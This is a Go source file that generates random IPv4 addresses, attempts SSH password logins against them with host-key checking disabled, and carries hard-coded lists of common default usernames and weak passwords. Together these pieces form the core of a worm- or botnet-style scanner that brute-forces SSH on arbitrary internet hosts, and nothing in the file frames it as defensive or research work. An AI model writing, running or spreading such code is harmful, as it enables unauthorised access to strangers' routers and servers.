package networking

import (
	"math/rand"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

// IpChunk returns a string composed of numbers between 1 - 255.
func IpChunk() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Intn(253) + 1)
}

// IpRandomAddress returns a random IP address.
func IpRandomAddress() string {
	return IpChunk() + "." + IpChunk() + "." + IpChunk() + "." + IpChunk()
}

// SshCheck returns nil if the credentials are correct.
func SshCheck(ip, user, pass string, port int) error {
	_, err := ssh.Dial("tcp", ip+":"+strconv.Itoa(port), &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Second * 2,
	})
	if err != nil {
		return err
	}

	return nil
}

// RandomSshUser returns a random username from sshUserList.
func RandomSshUser() string {
	rand.Seed(time.Now().UnixNano())
	return sshUserList[rand.Intn(len(sshUserList))]
}

// RandomSshPass returns a random password from sshPassList.
func RandomSshPass() string {
	rand.Seed(time.Now().UnixNano())
	return sshPassList[rand.Intn(len(sshPassList))]
}

var sshUserList = []string{
	"telekom",
	"default",
	"linux",
	"unix",
	"admin",
	"administrator",
	"service",
	"security",
	"guest",
	"system",
	"supervisor",
	"superuser",
	"cisco",
	"realtek",
	"root",
}

var sshPassList = []string{
	"telekom",
	"nopassword",
	"securepassword",
	"default",
	"pass",
	"linux",
	"unix",
	"admin",
	"admin1",
	"admin12",
	"admin123",
	"admin1234",
	"admin12345",
	"admin123456",
	"admin1234567",
	"admin12345678",
	"admin123456789",
	"administrator",
	"1234",
	"12345",
	"123456",
	"1234567",
	"12345678",
	"123456789",
	"toor",
	"realtek",
	"password123",
	"service",
	"security",
	"guest",
	"pass",
	"system",
	"supervisor",
	"superuser",
	"cisco",
	"password",
	"root",
}
